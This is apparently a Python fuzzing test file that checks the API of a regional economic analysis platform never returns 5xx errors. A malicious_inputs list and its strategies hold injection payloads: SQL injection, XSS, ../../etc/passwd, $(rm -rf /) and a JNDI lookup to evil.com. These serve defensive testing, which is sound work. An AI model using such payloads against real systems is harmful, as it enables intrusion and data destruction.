"""
Property-based fuzzing tests for the Regional Economic Analysis Platform.

Uses Hypothesis to generate random but well-formed inputs and check that
the API never crashes / 500s on edge cases.

OpenSSF Scorecard: Fuzzing check (>= 5/10).
"""
from __future__ import annotations

import os
import sys
from typing import Any, Dict, List

import pytest
from hypothesis import HealthCheck, given, settings, strategies as st

# Add project root to path
ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
if ROOT not in sys.path:
    sys.path.insert(0, ROOT)

# Add cwd as fallback
if os.getcwd() not in sys.path:
    sys.path.insert(0, os.getcwd())

try:
    from fastapi.testclient import TestClient
    from backend.api.main import app

    client = TestClient(app)
    HAS_APP = True
    _IMPORT_ERROR = None
except Exception as exc:  # pragma: no cover
    HAS_APP = False
    _IMPORT_ERROR = repr(exc)


# ============================================
# Strategies (input generators)
# ============================================
chinese_city = st.sampled_from([
    "深圳", "上海", "北京", "广州", "杭州",
    "成都", "苏州", "武汉", "南京", "西安",
    "火星", "不存在的城市", "", " ", "  "
])

# We allow long but not absurd city names (URL length limit safe)
city_name = st.text(
    min_size=0,
    max_size=64,
    alphabet=st.characters(
        whitelist_categories=("L", "N", "P", "Z"),
        max_codepoint=0x9FFF,
    ),
)

# Random city list for comparison
city_list = st.lists(
    st.sampled_from(["深圳", "上海", "北京", "广州", "杭州", "成都"]),
    min_size=0,
    max_size=10,
    unique=True,
)

# Numeric metrics for analysis
# Cannot combine min_value/max_value with allow_nan=True per Hypothesis API.
weight_value = st.floats(
    min_value=-1e6,
    max_value=1e6,
    allow_nan=False,
    allow_infinity=False,
)
years_count = st.integers(min_value=-100, max_value=10000)
metric_name = st.sampled_from([
    "gdp", "population", "land_price", "salary_level",
    "energy_cost", "talent_pool", "supply_chain_maturity", "policy_benefit",
    "innovation_index", "infra_score", "living_quality",
    "gdp_growth", "financing_cost", "tax_burden",
    "nonexistent", "", "DROP TABLE cities", "<script>alert(1)</script>",
])

industry = st.sampled_from([
    "半导体", "新能源", "生物医药", "智能制造", "金融科技",
    "人工智能", "电子商务", "汽车制造",
    "", "<script>", "' OR 1=1--",
])

# ============================================
# Skip if app not importable
# ============================================
pytestmark = pytest.mark.skipif(
    not HAS_APP,
    reason=f"FastAPI app not importable: {_IMPORT_ERROR if not HAS_APP else ''}"
)


# ============================================
# Tests: list endpoint must never 500
# ============================================
@given(city=city_name)
@settings(max_examples=50, deadline=2000, suppress_health_check=[HealthCheck.too_slow])
def test_get_city_never_500(city: str) -> None:
    """GET /api/v1/cities/{city} must not crash on arbitrary input."""
    # URL length safety: 64 chars max is already enforced by the strategy,
    # but be defensive in case of URL-encoding expansion.
    try:
        resp = client.get(f"/api/v1/cities/{city}")
    except Exception as exc:
        # Transport-level URL too long is acceptable; FastAPI itself is fine.
        if "URL too long" in str(exc) or "InvalidURL" in repr(exc):
            return
        raise
    assert resp.status_code in (200, 404, 422), (
        f"Unexpected status {resp.status_code} for city={city!r}: {resp.text[:200]}"
    )
    # 4xx is fine, 5xx is not
    assert resp.status_code < 500, f"Server error for city={city!r}"


@given(cities=city_list)
@settings(max_examples=30, deadline=3000, suppress_health_check=[HealthCheck.too_slow])
def test_compare_cities_never_500(cities: List[str]) -> None:
    """POST /api/v1/cities/compare must not crash on arbitrary input."""
    resp = client.post(
        "/api/v1/cities/compare",
        json={"cities": cities},
    )
    assert resp.status_code in (200, 400, 404, 422), (
        f"Unexpected status {resp.status_code} for cities={cities!r}"
    )
    assert resp.status_code < 500


# ============================================
# Tests: enterprise analysis must never 500
# ============================================
@given(
    city=chinese_city,
    industry_name=industry,
    years=years_count,
    bw=weight_value,
)
@settings(max_examples=40, deadline=3000, suppress_health_check=[HealthCheck.too_slow])
def test_enterprise_analysis_never_500(
    city: str, industry_name: str, years: int, bw: float,
) -> None:
    """POST /api/v1/analysis/enterprise must not crash on edge cases."""
    payload = {
        "city_name": city,
        "industry": industry_name,
        "company_size": "中型",
        "weight_business_cost": bw,
    }
    resp = client.post("/api/v1/analysis/enterprise", json=payload)
    assert resp.status_code in (200, 400, 404, 422), (
        f"Unexpected {resp.status_code} for payload={payload!r}"
    )
    assert resp.status_code < 500


# ============================================
# Tests: time series must never 500
# ============================================
@given(city=chinese_city, years=years_count, metric=metric_name)
@settings(max_examples=30, deadline=3000, suppress_health_check=[HealthCheck.too_slow])
def test_time_series_never_500(city: str, years: int, metric: str) -> None:
    """POST /api/v1/forecast/time-series must not crash."""
    payload = {
        "city": city,
        "years": years,
        "metrics": [metric],
    }
    resp = client.post("/api/v1/forecast/time-series", json=payload)
    assert resp.status_code < 500, (
        f"Server error for city={city!r}, years={years}, metric={metric!r}: {resp.text[:200]}"
    )


# ============================================
# Tests: SQL/XSS injection attempts
# ============================================
malicious_inputs = [
    "'; DROP TABLE cities;--",
    "1' OR '1'='1",
    "<script>alert('xss')</script>",
    "../../etc/passwd",
    "$(rm -rf /)",
    "{{7*7}}",
    "${jndi:ldap://evil.com/a}",
    "%00admin",
    "\x00\x01\x02",
    "A" * 1_000,
    "A" * 5_000,
]


@pytest.mark.parametrize("malicious", malicious_inputs)
def test_injection_inputs_handled_safely(malicious: str) -> None:
    """API must not crash on SQL/XSS/Path/Template injection attempts."""
    # Skip URL path tests if path would be too long (transport layer limit)
    if len(malicious) > 4096:
        endpoints = [("/api/v1/analysis/enterprise", "post")]
    else:
        endpoints = [
            (f"/api/v1/cities/{malicious}", "get"),
            ("/api/v1/analysis/enterprise", "post"),
        ]

    for endpoint, method in endpoints:
        if method == "get":
            try:
                resp = client.get(endpoint)
            except Exception as exc:
                # URL too long at transport layer is acceptable
                if "URL too long" in str(exc) or "InvalidURL" in repr(exc):
                    continue
                raise
        else:
            resp = client.post(endpoint, json={"city_name": malicious})

        # Must not return 5xx
        assert resp.status_code < 500, (
            f"5xx for malicious input on {endpoint}: {resp.status_code}"
        )
        # If response is 200, must not echo back the raw malicious payload unsanitised
        if resp.status_code == 200 and "html" in resp.headers.get("content-type", ""):
            assert malicious not in resp.text, (
                f"Possible reflected XSS on {endpoint}"
            )


# ============================================
# Tests: extremely large / empty payloads
# ============================================
@given(
    payload=st.dictionaries(
        keys=st.sampled_from(["city", "cities", "metrics", "data", "input"]),
        values=st.lists(st.text(max_size=1000), max_size=50),
        max_size=5,
    )
)
@settings(max_examples=20, deadline=3000, suppress_health_check=[HealthCheck.too_slow])
def test_large_payload_never_500(payload: Dict[str, Any]) -> None:
    """Large but valid JSON payloads must not crash the server."""
    resp = client.post("/api/v1/analysis/enterprise", json=payload)
    assert resp.status_code < 500


# ============================================
# Tests: health endpoint always responds
# ============================================
@given(st.integers(min_value=0, max_value=100))
@settings(max_examples=20, deadline=2000)
def test_health_always_200(_: int) -> None:
    """GET /health must always return 200."""
    resp = client.get("/health")
    assert resp.status_code == 200
    data = resp.json()
    assert "status" in data
